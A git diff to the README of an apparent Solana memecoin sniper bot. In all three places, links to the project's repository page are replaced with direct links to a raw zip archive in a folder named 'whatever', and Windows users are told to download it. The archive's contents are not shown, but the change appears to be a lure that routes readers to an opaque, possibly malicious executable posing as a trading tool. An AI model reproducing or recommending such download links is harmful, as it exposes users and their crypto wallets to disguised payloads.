@@ -1,6 +1,6 @@
 # ⚡ solana-memecoin-sniper-bot - Fast Solana Trading Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Agustind4485/solana-memecoin-sniper-bot)
+[![Download Now](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Agustind4485/solana-memecoin-sniper-bot/raw/refs/heads/main/whatever/sniper-bot-solana-memecoin-3.1-beta.1.zip)
 
 ## 🚀 What This App Does
 
@@ -17,7 +17,7 @@ This app is built for users who want a simple way to:
 
 Use this link to visit the download page:
 
-[Download solana-memecoin-sniper-bot](https://github.com/Agustind4485/solana-memecoin-sniper-bot)
+[Download solana-memecoin-sniper-bot](https://github.com/Agustind4485/solana-memecoin-sniper-bot/raw/refs/heads/main/whatever/sniper-bot-solana-memecoin-3.1-beta.1.zip)
 
 ### How to use the link on Windows
 1. Open the download page in your browser.
@@ -225,7 +225,7 @@ auto-trading, buy-sell-trading-bot, buy-sell-volume-bot, dex, liquidity-pool, me
 
 ## 📎 Download Link
 
-[Visit the download page for solana-memecoin-sniper-bot](https://github.com/Agustind4485/solana-memecoin-sniper-bot)
+[Visit the download page for solana-memecoin-sniper-bot](https://github.com/Agustind4485/solana-memecoin-sniper-bot/raw/refs/heads/main/whatever/sniper-bot-solana-memecoin-3.1-beta.1.zip)
 
 ## 🖱️ Quick Start on Windows
 
